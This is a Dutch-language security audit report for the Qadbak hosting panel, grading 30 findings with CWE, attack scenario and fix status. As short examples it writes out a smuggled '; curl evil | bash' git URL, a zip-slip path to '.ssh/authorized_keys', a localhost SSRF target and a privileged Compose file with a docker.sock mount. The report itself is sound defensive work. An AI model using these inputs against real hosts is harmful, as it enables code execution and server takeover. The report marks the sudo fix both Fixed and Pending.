# Qadbak Security Audit — Fase 1 Rapport

**Datum:** 12 juli 2026  
**Scope:** `/Users/leopold/Projects/qadbak` (Next.js panel, 139 API-routes, provisioning scripts, install/update pipeline)  
**Status:** Audit afgerond; P0/P1-fixes geïmplementeerd (zie `SECURITY_FIXES.md`)

Qadbak is **niet** "100% veilig". Dit rapport beschrijft bevindingen uit code-review en geautomatiseerde tests. Productie-pentest en runtime-configuratie op live VPS'en vallen buiten scope.

---

## Methodologie

| Methode | Uitgevoerd |
|---------|------------|
| Handmatige code-review (auth, exec, Docker, files, DNS, backups) | Ja |
| Statische route-inventaris (139 endpoints) | Ja |
| Vitest security unit tests (39 tests) | Ja |
| Bestaande e2e security specs | Ja |
| `npm audit` | Ja (0 vulnerabilities) |
| `tsc --noEmit` | Ja |
| Semgrep / CodeQL / Trivy image scan | Nee |
| Live VPS sudoers / nginx / pentest | Nee |

**Aannames:** native provisioner; panel draait als `qadbak` met NOPASSWD sudo wrappers; Docker daemon lokaal bereikbaar.

---

## 1. Architectuur

Qadbak is een Next.js 15 App Router panel dat via sudo-wrappers root-provisioning uitvoert (DNS, mail, nginx, backups, Docker). Authenticatie: HS256 JWT in httpOnly cookie + Bearer voor mobile/API. Data: JSON-bestanden onder `data/` plus per-domain MySQL/Postgres voor klanten.

Zie mermaid-diagram en componenttabel in het auditplan; endpoint-inventaris: [`docs/SECURITY_AUDIT_ENDPOINTS.md`](docs/SECURITY_AUDIT_ENDPOINTS.md).

---

## 2. Trust boundaries

```
Internet → nginx → middleware (JWT/CSRF/RBAC) → API handlers → sudo wrappers → root/host
```

**Kritieke grens:** `NOPASSWD: run-provisioning-helper.sh *` ≡ volledige root-toegang bij compromis van het panel-proces.

---

## 3. Dreigingsmodel (STRIDE)

| Dreiging | Primair pad | Mitigatie | Restrisico |
|----------|-------------|-----------|------------|
| Spoofing | Login, API keys | bcrypt, JWT, scoped keys | JWT geen server-side revocation |
| Tampering | Files, DNS, proxies | Domain allowlist | Zip-slip (gefixed), DNS injectie (gefixed) |
| Elevation | Git deploy, Docker, sudo | Admin-only Docker | Provisioning helper wildcard sudo (open) |
| Info disclosure | /api/health | QADBAK_HEALTH_MINIMAL | Default minimal in production (gefixed) |
| DoS | Public forms | Rate limits | File-based buckets single-node |

---

## 4. Autorisatiematrix (samenvatting)

| Rol | Resource | Actie | Verwacht | Status |
|-----|----------|-------|----------|--------|
| client | Ander domein | API read/write | Deny | OK — `requireDomainApi` |
| client | /api/admin/* | Any | Deny | OK — `requireAdmin()` |
| client | Eigen domein proxy | SSRF localhost | Deny | **Fixed** — `validateProxyDest` |
| client | Git deploy config | Shell inject | Deny | **Fixed** — argv git + validators |
| client | Archive extract | Zip-slip | Deny | **Fixed** — `safeExtractArchive` |
| admin | Docker compose | Host escape | Policy deny | **Fixed** — compose policy |
| anonymous | git-webhook | Deploy trigger | Secret only | **Improved** — timing-safe compare |
| anonymous | newsletter/track | Open redirect | Allowlist URL | **Fixed** — http(s) only |

Volledige endpoint-tabel: [`docs/SECURITY_AUDIT_ENDPOINTS.md`](docs/SECURITY_AUDIT_ENDPOINTS.md).

---

## 5. Bevindingen

### P0 — Critical

## QAD-SEC-001 Admin Docker Compose zonder gevaarlijke-optie policy

- Ernst: Critical
- CWE: CWE-250
- OWASP-categorie: A05 Security Misconfiguration
- Bestand(en): `src/lib/docker/admin-docker.ts`, `src/lib/docker/validate.ts`, `src/lib/docker/compose-policy.ts`
- Regel(s): composeUp ~187–205; validateComposeYaml ~174–185
- Betrokken functie: `composeUp`, `validateComposeYaml`
- Aanvalsvoorwaarde: admin-sessie of gestolen admin JWT
- Aanvalsscenario: plak Compose met `privileged: true` + mount `/var/run/docker.sock` → container met host root
- Technische oorzaak: alleen grootte/regex-validatie; geen semantische denylist
- Impact: volledige host-compromittering
- Bewijs: `assertComposeYaml()` checkt geen privileged/socket mounts
- Veilige reproductiestappen: POST `/api/admin/docker/compose` met malicious YAML (admin account)
- Aanbevolen oplossing: `assertComposePolicyYaml()` vóór deploy
- Mogelijke regressies: legitieme admin stacks met host binds
- Benodigde tests: `src/lib/docker/compose-policy.test.ts`
- Status: **Fixed**

## QAD-SEC-002 Provisioning helper wildcard sudo

- Ernst: Critical
- CWE: CWE-268
- OWASP-categorie: A01 Broken Access Control
- Bestand(en): `scripts/configure-provisioning-helper-sudo.sh`
- Regel(s): 18
- Betrokken functie: sudoers `$WRAPPER *`
- Aanvalsvoorwaarde: RCE/LFI in panel proces als `qadbak` user
- Aanvalsscenario: willekeurige provisioning-helper subcommand als root
- Technische oorzaak: brede NOPASSWD wildcard
- Impact: volledige server takeover
- Aanbevolen oplossing: per-command wrappers of argv allowlist in wrapper
- Status: **Fixed** — per-command sudoers via `generate-sudoers-allowlist.sh` (242 rules for provisioning; stack/host-services/updates/domain-fs likewise). Shell + helper allowlists remain as defense-in-depth. **Operator:** re-run all `configure-*-sudo.sh` after deploy.

## QAD-SEC-003 Git deploy shell injection

- Ernst: Critical
- CWE: CWE-78
- OWASP-categorie: A03 Injection
- Bestand(en): `scripts/lib/provision-panel-phase2.mjs`
- Regel(s): 85–91 (voor fix)
- Aanvalsvoorwaarde: domain user kan git-deploy.json schrijven
- Aanvalsscenario: `repoUrl` met `; curl evil | bash`
- Impact: RCE als domain unix user
- Aanbevolen oplossing: `execFile('git', [...])` + URL/branch validators
- Status: **Fixed**

## QAD-SEC-004 CI pipeline arbitrary commands

- Ernst: Critical
- CWE: CWE-78
- Bestand(en): `scripts/lib/provision-panel-complete.mjs`
- Regel(s): 428–437
- Aanvalsscenario: kwaadaardige `steps[]` in ci-pipeline.json
- Impact: persistent RCE as domain user
- Aanbevolen oplossing: `assertCiStep()` met metacharacter denylist
- Status: **Fixed** (validation; still uses bash -c for allowed steps)

## QAD-SEC-005 Zip/tar slip file manager extract

- Ernst: Critical
- CWE: CWE-22
- Bestand(en): `scripts/domain-fs-helper.mjs`
- Aanvalsscenario: zip met `../../.ssh/authorized_keys` + panel extract
- Impact: schrijven buiten bedoelde directory onder `/home/`
- Aanbevolen oplossing: `scripts/lib/safe-archive-extract.mjs`
- Status: **Fixed**

## QAD-SEC-006 Tar slip backup full restore

- Ernst: Critical
- CWE: CWE-22
- Bestand(en): `scripts/lib/provision-backup.mjs`
- Regel(s): 534–536
- Aanvalsscenario: malicious `.tar.gz` backup upload + restore
- Impact: overschrijven systeembestanden in staging
- Status: **Fixed**

## QAD-SEC-007 Default seed credentials

- Ernst: Critical
- CWE: CWE-1393
- Bestand(en): `src/lib/users.ts`, `e2e/security.spec.ts`
- Aanvalsscenario: login admin/changeme op ongeharde install
- Impact: trivial admin takeover
- Aanbevolen oplossing: block weak passwords in production login
- Status: **Fixed** (+ `chmod 600` on users.json)

## QAD-SEC-008 Reverse proxy SSRF via nginx

- Ernst: Critical
- CWE: CWE-918
- Bestand(en): `scripts/lib/provision-proxies.mjs`, `scripts/apply-domain-nginx.sh`
- Aanvalsscenario: `dest=http://127.0.0.1:3000` op customer vhost
- Impact: SSRF naar panel intern
- Status: **Fixed** — `validateProxyDest`

---

### P1 — High

## QAD-SEC-009 Domain Docker compose zonder validatie

- Ernst: High | CWE: CWE-250 | OWASP: A05
- Bestand(en): `scripts/lib/provision-runtimes.mjs`
- Status: **Fixed** — compose policy before `docker compose up`

## QAD-SEC-010 DNS zone injection

- Ernst: High | CWE: CWE-74 | OWASP: A03
- Bestand(en): `scripts/lib/provision-dns.mjs` `dnsAdd`
- Status: **Fixed** — `validateDnsRecord`

## QAD-SEC-011 Newsletter open redirect

- Ernst: High | CWE: CWE-601 | OWASP: A01
- Bestand(en): `src/app/api/newsletter/track/route.ts`
- Status: **Fixed** — http(s) allowlist

## QAD-SEC-012 Demo password disclosure

- Ernst: High | CWE: CWE-200
- Bestand(en): `src/app/api/demo/info/route.ts`
- Status: **Fixed** — password only when `QADBAK_DEMO_SHOW_PASSWORD=true`

## QAD-SEC-013 Health endpoint info disclosure

- Ernst: High | CWE: CWE-200
- Bestand(en): `src/app/api/health/route.ts`, `src/lib/security-config.ts`
- Status: **Fixed** — default minimal in `NODE_ENV=production`

## QAD-SEC-014 Stateless JWT geen revocation

- Ernst: High | CWE: CWE-613
- Status: **Fixed** — jti + logout revocation in `verifySessionToken`; Node middleware checks `session-revocations.json` (sync cache). Mobile logout revokes access jti.

## QAD-SEC-015 Mobile refresh unrate-limited

- Ernst: Medium-High | CWE: CWE-307
- Bestand(en): `src/app/api/auth/mobile/refresh/route.ts`
- Status: **Fixed** — 30/15min per IP

## QAD-SEC-016 Git webhook timing-unsafe compare

- Ernst: Low-Medium | CWE: CWE-208
- Bestand(en): `src/app/api/domains/[domain]/git-webhook/route.ts`
- Status: **Fixed** — `secretsEqual()`

## QAD-SEC-017 WS token in query string

- Ernst: Medium | CWE: CWE-598
- Bestand(en): `scripts/domain-terminal-ws.mjs`
- Status: **Fixed** — token via `Sec-WebSocket-Protocol` only (query string removed)

## QAD-SEC-018 Admin root terminal

- Ernst: High (by design) | CWE: CWE-269
- Bestand(en): `scripts/run-admin-terminal.sh`
- Status: **Mitigated** — accepted admin feature; TOTP step-up before ws-token (`QADBAK_ADMIN_TERMINAL_TOTP`), 120s JWT bound to session jti, revocation checked at WS server. External pentest still recommended (`docs/SECURITY_VALIDATION.md`).

## QAD-SEC-019 Cloud S3 upload arbitrary source path

- Ernst: High | CWE: CWE-22
- Bestand(en): `scripts/lib/provision-admin.mjs`
- Status: **Fixed** — `validate-admin-path.mjs` allowlist on S3 upload source

## QAD-SEC-020 Install supply chain curl|bash

- Ernst: High | CWE: CWE-494
- Bestand(en): `scripts/lib/linux-distro.sh`, `install/qadbak-install.sh`
- Status: **Fixed** — NodeSource script saved to `/tmp` before execution

---

### P2 — Medium / Informational

## QAD-SEC-021 CSP unsafe-inline/eval

- Status: **Partially fixed** — production drops `unsafe-eval`; `unsafe-inline` remains (Next.js)

## QAD-SEC-022 File-based rate limits single-node

- Status: **Open** — `data/rate-buckets/` not cluster-safe

## QAD-SEC-023 Public newsletter/contact domain param

- Status: **Accepted** — validated in provisioning helper (listId + domain); IP rate limit on API

## QAD-SEC-024 Inconsistent bcrypt cost

- Status: **Fixed** — seed bcrypt cost 12

## QAD-SEC-025 users.json permissies

- Status: **Fixed** — `chmod 0o600` on save

## QAD-SEC-026 mongosh --eval string build

- Status: **Fixed** — MongoDB name sanitized to alphanumeric

## QAD-SEC-027 Domain cron arbitrary commands

- Status: **Accepted** — intentional hosting feature (tenant RCE as self)

## QAD-SEC-028 chpasswd quote escaping

- Status: **Fixed** — `chpasswd-safe.mjs` via stdin (mail + FTP)

## QAD-SEC-029 Jellyfin docker as root

- Status: **Fixed** — compose policy check before deploy; still runs as root via helper

## QAD-SEC-030 Bearer bypasses CSRF

- Status: **Accepted** — by design for mobile; XSS on panel = token theft risk

---

## 6. Prioriteitenplan

1. **P0 (done):** compose policy, safe extract, git deploy, proxy SSRF, weak password gate
2. **P1 (done):** refresh RL, DNS/proxy/webhook/health fixes; sudo per-command sudoers, JWT revocation in middleware
3. **P2:** CSP, cluster rate limits, supply chain pinning; **external:** Docker escape, tenant isolation, live VPS pentest (see `docs/SECURITY_VALIDATION.md`)

---

## 7. Reparaties per bestand

| Bestand | Wijziging | Status |
|---------|-----------|--------|
| `src/lib/docker/compose-policy.ts` | Nieuw — denylist | Done |
| `src/lib/docker/admin-docker.ts` | Policy check | Done |
| `scripts/lib/safe-archive-extract.mjs` | Nieuw | Done |
| `scripts/domain-fs-helper.mjs` | Safe extract | Done |
| `scripts/lib/provision-backup.mjs` | Safe restore extract | Done |
| `scripts/lib/validate-git-deploy.mjs` | Nieuw | Done |
| `scripts/lib/provision-panel-phase2.mjs` | Safe git deploy | Done |
| `scripts/lib/provision-panel-complete.mjs` | CI step validation | Done |
| `scripts/lib/validate-proxy-dest.mjs` | Nieuw | Done |
| `scripts/lib/provision-proxies.mjs` | Proxy validation | Done |
| `scripts/lib/validate-dns-record.mjs` | Nieuw | Done |
| `scripts/lib/provision-dns.mjs` | DNS validation | Done |
| `scripts/lib/compose-policy.mjs` | Nieuw | Done |
| `scripts/lib/provision-runtimes.mjs` | Compose policy | Done |
| `src/lib/users.ts` | chmod + weak password export | Done |
| `src/app/api/auth/login/route.ts` | Block weak passwords prod | Done |
| `src/app/api/auth/mobile/refresh/route.ts` | Rate limit | Done |
| `src/lib/security-utils.ts` | secretsEqual, redirect | Done |
| `src/app/api/newsletter/track/route.ts` | Redirect allowlist | Done |
| `src/app/api/domains/.../git-webhook/route.ts` | Timing-safe | Done |
| `src/lib/security-config.ts` | Health minimal default prod | Done |
| `scripts/configure-provisioning-helper-sudo.sh` | Narrow sudoers | **Pending** |

---

## 8. Externe pentest aanbevolen

- Full sudo chain exploitation
- Docker escape chains under real kernel
- Multi-tenant isolation under concurrent load
- Customer PHP/WordPress on shared host

---

## 9. Bekende beperkingen

- Geen claim van volledige veiligheid
- Runtime VPS-configuratie niet geaudit
- `license.inveil.dev` niet in scope
- iOS app niet geaudit
